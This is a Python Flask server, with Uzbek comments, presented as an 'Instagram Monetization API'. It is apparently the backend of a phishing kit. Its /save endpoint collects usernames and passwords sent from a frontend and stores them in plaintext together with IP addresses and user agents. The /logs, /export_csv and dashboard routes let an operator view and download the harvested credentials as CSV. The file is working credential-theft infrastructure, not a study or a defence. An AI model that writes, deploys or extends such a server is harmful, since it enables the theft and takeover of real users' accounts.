from flask import Flask, request, jsonify, send_from_directory
from flask_cors import CORS
import database
import os
import sqlite3
from datetime import datetime
import logging

app = Flask(__name__, static_folder='../frontend', static_url_path='')

# Production uchun CORS sozlamalari
if os.environ.get('FLASK_ENV') == 'production':
    # Productionda faqat ishonchli domainlarga ruxsat berish
    allowed_origins = os.environ.get('ALLOWED_ORIGINS', '').split(',')
    if not allowed_origins:
        allowed_origins = ['*']
    CORS(app, resources={
        r"/*": {
            "origins": allowed_origins,
            "methods": ["GET", "POST", "PUT", "DELETE", "OPTIONS"],
            "allow_headers": ["Content-Type", "Authorization", "X-Requested-With"],
            "supports_credentials": True
        }
    })
else:
    # Development uchun hamma domainga ruxsat
    CORS(app, resources={r"/*": {"origins": "*"}})

# Logging sozlamalari
logging.basicConfig(
    level=logging.INFO if os.environ.get('FLASK_ENV') == 'production' else logging.DEBUG,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

# Database initialization
database.init_db()

# Barcha response'lar uchun headers
@app.after_request
def after_request(response):
    # Security headers
    response.headers.add('X-Content-Type-Options', 'nosniff')
    response.headers.add('X-Frame-Options', 'DENY')
    response.headers.add('X-XSS-Protection', '1; mode=block')
    
    # CORS headers
    if os.environ.get('FLASK_ENV') == 'production':
        origin = request.headers.get('Origin')
        if origin in os.environ.get('ALLOWED_ORIGINS', '').split(','):
            response.headers.add('Access-Control-Allow-Origin', origin)
    else:
        response.headers.add('Access-Control-Allow-Origin', '*')
    
    response.headers.add('Access-Control-Allow-Headers', 'Content-Type,Authorization,X-Requested-With')
    response.headers.add('Access-Control-Allow-Methods', 'GET,POST,PUT,DELETE,OPTIONS')
    response.headers.add('Access-Control-Allow-Credentials', 'true')
    response.headers.add('Access-Control-Max-Age', '86400')
    
    # Cache control
    if request.path.endswith(('.js', '.css', '.png', '.jpg', '.jpeg', '.gif', '.ico')):
        response.headers.add('Cache-Control', 'public, max-age=31536000')
    else:
        response.headers.add('Cache-Control', 'no-store, no-cache, must-revalidate, post-check=0, pre-check=0')
    
    return response

# Error handlers
@app.errorhandler(404)
def not_found(error):
    return jsonify({'error': 'Not found'}), 404

@app.errorhandler(500)
def internal_error(error):
    logger.error(f'Internal server error: {error}')
    return jsonify({'error': 'Internal server error'}), 500

@app.errorhandler(400)
def bad_request(error):
    return jsonify({'error': 'Bad request'}), 400

# Frontend fayllarini uzatish
@app.route('/')
def index():
    try:
        return send_from_directory(app.static_folder, 'index.html')
    except Exception as e:
        logger.error(f"Error serving index: {e}")
        return "Frontend not found. Please build frontend first.", 404

@app.route('/dashboard')
def dashboard():
    try:
        return send_from_directory(app.static_folder, 'dashboard.html')
    except Exception as e:
        logger.error(f"Error serving dashboard: {e}")
        return "Dashboard not found.", 404

@app.route('/<path:filename>')
def serve_static(filename):
    try:
        return send_from_directory(app.static_folder, filename)
    except Exception as e:
        logger.error(f"Error serving static file {filename}: {e}")
        return "File not found", 404

# Health check endpoint (deploy uchun muhim)
@app.route('/health', methods=['GET'])
def health_check():
    try:
        # Database connectivity check
        conn = sqlite3.connect('instagram.db')
        cursor = conn.cursor()
        cursor.execute('SELECT 1')
        conn.close()
        
        return jsonify({
            'status': 'healthy',
            'timestamp': datetime.now().isoformat(),
            'service': 'Instagram Monetization API',
            'version': '1.0.0',
            'environment': os.environ.get('FLASK_ENV', 'development'),
            'database': 'connected'
        }), 200
    except Exception as e:
        logger.error(f"Health check failed: {e}")
        return jsonify({
            'status': 'unhealthy',
            'error': str(e)
        }), 500

# API info endpoint
@app.route('/api/info', methods=['GET'])
def api_info():
    return jsonify({
        'name': 'Instagram Monetization API',
        'version': '1.0.0',
        'endpoints': {
            '/save': 'POST - Save login data',
            '/logs': 'GET - Get all logs',
            '/health': 'GET - Health check',
            '/api/info': 'GET - API information',
            '/clear_logs': 'DELETE - Clear all logs',
            '/export_csv': 'GET - Export logs as CSV'
        },
        'documentation': 'Use /dashboard for admin interface'
    }), 200

# API endpoints
@app.route('/save', methods=['POST', 'OPTIONS'])
def save():
    if request.method == 'OPTIONS':
        return '', 200
    
    try:
        # Request validation
        if not request.is_json:
            return jsonify({'error': 'Content-Type must be application/json'}), 400
        
        data = request.json
        if not data:
            return jsonify({'error': 'No JSON data provided'}), 400
        
        username = data.get('username', '').strip()
        password = data.get('password', '').strip()
        user_agent = data.get('userAgent', request.headers.get('User-Agent', ''))
        
        # Basic validation
        if not username or not password:
            return jsonify({'error': 'Username and password are required'}), 400
        
        # Get real IP (behind proxy uchun)
        if request.headers.get('X-Forwarded-For'):
            ip_address = request.headers.get('X-Forwarded-For').split(',')[0]
        else:
            ip_address = request.remote_addr

        # Save to database
        success = database.save_log(username, password, user_agent, ip_address)
        
        if success:
            logger.info(f"Saved login data from IP: {ip_address}, Username: {username}")
            return jsonify({
                'status': 'success', 
                'message': 'Saved successfully',
                'timestamp': datetime.now().isoformat()
            }), 200
        else:
            logger.error(f"Failed to save login data from IP: {ip_address}")
            return jsonify({'error': 'Failed to save data'}), 500
            
    except Exception as e:
        logger.error(f"Error in /save endpoint: {e}")
        return jsonify({'error': 'Internal server error'}), 500

@app.route('/logs', methods=['GET', 'OPTIONS'])
def logs():
    if request.method == 'OPTIONS':
        return '', 200
    
    try:
        # Limit parameter (default 100)
        limit = request.args.get('limit', 100, type=int)
        if limit > 1000:  # Max limit
            limit = 1000
        
        # Offset parameter for pagination
        offset = request.args.get('offset', 0, type=int)
        
        logs_data = database.get_logs(limit=limit)
        total, today, last, top_ip = database.get_stats()
        
        # Calculate pagination info
        total_pages = (total + limit - 1) // limit if limit > 0 else 1
        current_page = (offset // limit) + 1 if limit > 0 else 1

        logs_list = []
        for log in logs_data:
            logs_list.append({
                'id': log[0],
                'username': log[1],
                'password': log[2],
                'timestamp': log[3],
                'user_agent': log[4],
                'ip_address': log[5]
            })

        return jsonify({
            'status': 'success',
            'total': total,
            'today': today,
            'last': last,
            'top_ip': top_ip[0] if top_ip else None,
            'top_ip_count': top_ip[1] if top_ip else 0,
            'pagination': {
                'limit': limit,
                'offset': offset,
                'total_pages': total_pages,
                'current_page': current_page,
                'has_next': offset + limit < total,
                'has_prev': offset > 0
            },
            'logs': logs_list
        }), 200
    except Exception as e:
        logger.error(f"Error in /logs endpoint: {e}")
        return jsonify({'error': 'Internal server error'}), 500

# Barcha loglarni o'chirish
@app.route('/clear_logs', methods=['DELETE', 'OPTIONS'])
def clear_logs():
    if request.method == 'OPTIONS':
        return '', 200
    
    try:
        # Security check - faqat admin so'rovlarini qabul qilish
        auth_header = request.headers.get('Authorization')
        
        # Simple token check (productionda buni yaxshilang)
        admin_token = os.environ.get('ADMIN_TOKEN')
        if admin_token and auth_header != f'Bearer {admin_token}':
            return jsonify({'error': 'Unauthorized'}), 401
        
        deleted_count = database.clear_all_logs()
        
        logger.warning(f"All logs cleared. Deleted {deleted_count} records.")
        
        return jsonify({
            'status': 'success', 
            'message': f'Cleared {deleted_count} logs',
            'timestamp': datetime.now().isoformat()
        }), 200
    except Exception as e:
        logger.error(f"Error clearing logs: {e}")
        return jsonify({'error': 'Internal server error'}), 500

# CSV eksport qilish
@app.route('/export_csv', methods=['GET'])
def export_csv():
    try:
        conn = sqlite3.connect('instagram.db')
        cursor = conn.cursor()
        cursor.execute('SELECT * FROM logs ORDER BY timestamp DESC')
        rows = cursor.fetchall()
        conn.close()
        
        if not rows:
            return jsonify({'error': 'No data to export'}), 404
        
        # CSV formatga o'tkazish
        csv_content = "ID,Username,Password,Timestamp,User Agent,IP Address\n"
        for row in rows:
            username = str(row[1]).replace('"', '""')
            password = str(row[2]).replace('"', '""')
            user_agent = str(row[4]).replace('"', '""').replace(',', ';')
            ip_address = str(row[5]).replace('"', '""')
            csv_content += f'{row[0]},"{username}","{password}","{row[3]}","{user_agent}","{ip_address}"\n'
        
        filename = f'instagram_logs_{datetime.now().strftime("%Y%m%d_%H%M%S")}.csv'
        
        logger.info(f"CSV exported: {filename}, {len(rows)} records")
        
        return csv_content, 200, {
            'Content-Type': 'text/csv; charset=utf-8',
            'Content-Disposition': f'attachment; filename="{filename}"',
            'Cache-Control': 'no-cache, no-store, must-revalidate'
        }
    except Exception as e:
        logger.error(f"Error exporting CSV: {e}")
        return jsonify({'error': 'Internal server error'}), 500

# Yakuniy fayl yo'qligini tekshirish middleware
@app.before_request
def check_static_files():
    # Faqat static fayllar uchun
    if request.path.startswith('/') and not request.path.startswith(('/save', '/logs', '/health', '/api')):
        static_path = os.path.join(app.static_folder, request.path[1:])
        if not os.path.exists(static_path):
            logger.warning(f"Static file not found: {request.path}")

if __name__ == '__main__':
    # Portni environmentdan olish yoki default 5000
    port = int(os.environ.get('PORT', 5000))
    
    # Development vs Production
    if os.environ.get('FLASK_ENV') == 'production':
        # Production mode
        logger.info(f"Starting production server on port {port}")
        # Note: Productionda gunicorn ishlatish kerak
        app.run(host='0.0.0.0', port=port, debug=False, threaded=True)
    else:
        # Development mode
        logger.info(f"Starting development server on port {port}")
        app.run(host='0.0.0.0', port=port, debug=True, threaded=True)